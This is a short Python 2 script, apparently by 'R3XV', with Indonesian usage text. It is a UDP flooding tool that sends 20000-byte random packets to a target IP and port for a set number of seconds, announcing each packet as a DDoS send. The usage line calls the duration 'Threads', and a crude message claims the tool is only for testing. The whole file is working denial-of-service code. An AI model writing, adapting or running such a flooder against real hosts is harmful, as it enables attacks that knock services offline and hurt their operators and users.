import time
import socket
import random
import sys
def usage():
    print "Cara Penggunaan: " "python2 TestDDOS.py " "<IP> <Port> <Threads>"
    print "EH BABI KALAU PAKAI DDOS JANGAN PAKAI INI INI TOOLS UNTUK TEST DOANG JADI NGGAK TEMBUS TEMBUS..!"
def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "DDOS SEND TO IP %s | Port %s | Script BY R3XV !!"%(victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()

